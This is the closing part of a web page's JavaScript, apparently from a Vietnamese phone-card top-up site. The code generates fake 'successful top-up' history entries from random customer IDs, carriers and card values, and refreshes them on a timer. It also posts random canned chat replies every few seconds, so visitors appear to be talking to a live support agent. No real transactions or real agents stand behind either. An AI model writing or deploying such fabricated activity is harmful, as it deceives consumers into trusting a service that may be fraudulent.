                        txtHistory: 'Nạp thành công thẻ ' + arrayTelCo[Math.floor(1 + Math.random() * arrayTelCo.length) - 1] + ' mệnh giá ' + arrayPrice[Math.floor(1 + Math.random() * arrayPrice.length) - 1]
                    }
                    html += templateHistoryResponse(contentHistory);
                }
                $('#tblHistory').html(html);
                setInterval(function () {
                    var html = '';
                    for (var i = 0; i < 10; i++) {
                        var contentHistory = {
                            idCustomer: '******' + Math.floor(100000 + Math.random() * 900000),
                            txtHistory: 'Nạp thành công thẻ ' + arrayTelCo[Math.floor(1 + Math.random() * arrayTelCo.length) - 1] + ' mệnh giá ' + arrayPrice[Math.floor(1 + Math.random() * arrayPrice.length) - 1]
                        }
                        html += templateHistoryResponse(contentHistory);
                    }
                    $('#tblHistory').html(html);
                }, 80000);

                setInterval(function () {
                    // responses
                    var templateResponse = Handlebars.compile($("#message-response-template").html());
                    var contextResponse = {
                        response: this.getRandomItem(this.messageResponses),
                        time: this.getCurrentTime()
                    };
                    this.$chatHistoryList.append(templateResponse(contextResponse));
                    this.scrollToBottom();
                }.bind(this), 5000);
            },

            addMessage: function () {
                this.messageToSend = this.$textarea.val();
                this.render();
            },
            addMessageEnter: function (event) {
                // enter was pressed
                if (event.keyCode === 13) {
                    this.addMessage();
                }
            },
            scrollToBottom: function () {
                $('.chat-scroll').scrollTop($('.chat-scroll')[0].scrollHeight);
            },
            getCurrentTime: function () {
                return new Date().toLocaleTimeString().
                replace(/([\d]+:[\d]{2})(:[\d]{2})(.*)/, "$1$3");
            },
            getRandomItem: function (arr) {
                return arr[Math.floor(Math.random() * arr.length)];
            }
        };

        chat.init();

    })();
    //# sourceURL=pen.js
</script>


</body>

</html>